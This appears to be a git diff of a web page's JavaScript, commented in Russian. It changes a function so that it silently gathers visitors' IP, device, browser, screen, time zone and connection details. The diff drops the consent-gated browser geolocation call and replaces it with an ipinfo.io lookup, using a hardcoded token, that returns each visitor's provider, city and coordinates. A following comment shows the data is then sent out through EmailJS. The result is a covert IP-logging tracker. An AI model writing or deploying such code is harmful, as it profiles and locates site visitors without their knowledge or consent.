@@ -49,37 +49,52 @@
         }
 
         // Сбор всех данных пользователя
-        function collectUserData(ip) {
-            return new Promise((resolve) => {
-                const connectionInfo = getConnectionInfo();
+        async function collectUserData(ip) {
+            const connectionInfo = getConnectionInfo();
+            const deviceType = getDeviceType();
 
-                let userData = {
-                    ip: ip,
-                    deviceType: getDeviceType(),
-                    userAgent: navigator.userAgent,
-                    browserLanguage: navigator.language || "Неизвестно",
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
-                    connectionType: connectionInfo.type,
-                    connectionSpeed: connectionInfo.downlink,
-                    connectionRTT: connectionInfo.rtt
-                };
-
-                // Геолокация через браузер
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((position) => {
-                        userData.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        resolve(userData);
-                    }, () => {
-                        resolve(userData);
-                    });
-                } else {
-                    resolve(userData);
+            let userData = {
+                ip: ip,
+                deviceType: deviceType,
+                userAgent: navigator.userAgent,
+                browserLanguage: navigator.language || "Неизвестно",
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
+                connectionType: connectionInfo.type,
+                connectionSpeed: connectionInfo.downlink,
+                connectionRTT: connectionInfo.rtt,
+                provider: "Неизвестно",
+                location: {
+                    city: "Неизвестно",
+                    region: "Неизвестно",
+                    country: "Неизвестно",
+                    latitude: "Неизвестно",
+                    longitude: "Неизвестно"
                 }
-            });
+            };
+
+            try {
+                // Запрос данных с ipinfo.io
+                const response = await fetch(`https://ipinfo.io/${ip}?token=229d6455ecea02`);
+                const data = await response.json();
+                
+                if (data) {
+                    userData.provider = data.org || "Неизвестно";
+                    userData.location.city = data.city || "Неизвестно";
+                    userData.location.region = data.region || "Неизвестно";
+                    userData.location.country = data.country || "Неизвестно";
+                    
+                    if (data.loc) {
+                        const [latitude, longitude] = data.loc.split(',');
+                        userData.location.latitude = latitude || "Неизвестно";
+                        userData.location.longitude = longitude || "Неизвестно";
+                    }
+                }
+            } catch (error) {
+                console.error("Ошибка при получении данных с ipinfo.io:", error);
+            }
+
+            return userData;
         }
 
         // Отправка данных через EmailJS
